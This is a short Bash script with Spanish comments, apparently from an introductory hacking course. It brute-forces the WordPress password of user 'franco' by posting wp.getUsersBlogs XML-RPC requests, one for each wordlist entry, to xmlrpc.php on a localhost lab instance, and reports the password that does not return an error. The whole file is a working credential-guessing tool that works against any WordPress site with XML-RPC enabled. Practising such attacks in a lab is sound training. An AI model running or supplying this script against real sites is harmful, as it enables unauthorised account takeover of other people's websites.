#!/bin/bash

function ctrl_c(){
  echo -e "\n[!] Saliendo...\n"
  exit 1
}

# Ctrl + C
trap ctrl_c SIGINT

function createXML(){
  password=$1

  # Misma estructura del xml anterior (con triple comillas se pone un bloque de codigo, las \ son para escapar las comillas dobles y que nos lo represente):
  xmlFile="""
<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
    <param>
        <value>
            <string>franco</string>
        </value>
    </param>
    <param>
        <value>
            <string>$password</string>
        </value>
    </param>
</params>
</methodCall>
  """

  echo $xmlFile > file.xml

  response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml)

  if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
    echo -e "\n [+] La contrasena para el usuario franco es $password"
    exit 0
  fi
}

# Comenzamos recorriendo las primeras lineas del diccionario a utilizar.
cat /home/anonimo/Escritorio/Hack4u/CursoIntroHacking/enumeraciones/dicc_prueba.txt | while read password; do
  createXML $password
done

